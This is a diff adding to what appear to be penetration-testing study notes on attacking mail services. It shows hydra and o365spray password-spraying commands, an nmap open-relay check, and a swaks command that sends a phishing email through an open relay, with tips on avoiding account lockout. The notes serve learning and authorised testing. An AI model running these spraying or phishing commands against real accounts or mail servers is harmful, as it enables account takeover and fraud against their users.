@@ -86,3 +86,47 @@ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
 
 ## Password Attacks
 
+We can use `hydra` to do password spraying attacks or brute force against services like `SMTP`, `POP3`, or `IMPA4`.
+#### Hydra - Password Attack
+
+```sh
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+```
+
+When conducting password spraying on cloud services that supports `SMTP`, `POP3`, or `IMAP4` using tools like `hydra`, these tools are usually blocked. Instead, we use custom tools like [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
+#### O365 Spray - Password Spraying
+
+```sh
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+```
+
+## Protocol Specifics Attacks
+
+An **Open Relay** is an SMTP server that was misconfigured or intentionally configured to allow an unauthenticated email relay. Messaging servers configured as open relays allow emails to be re-routed through the open relay server. This masks the source of the messages and makes the email looks like it originated from the relay server.
+### Open Relay
+
+We can enumerate if an SMTP port allows an open relay using `nmap smtp-open-relay`
+
+```sh
+nmap -p25 -Pn --script smtp-open-relay $IP
+```
+
+Next, we can use any email client to connect to the mail server and send our email:
+
+```sh
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $IP
+```
+
+---
+
+```ad-tldr
+When enumerating **SMTP** users using `smtp-user-enum`, use the `-M RCPT` option, other options didn't work with me.
+
+---
+
+When spraying passwords for a valid user using `hydra`:
+	- Beware of getting blocked or locking the account
+	- Use the full email as the user, don't just put only username
+	- When specifying the target, use IP instead of domain 
+```
+
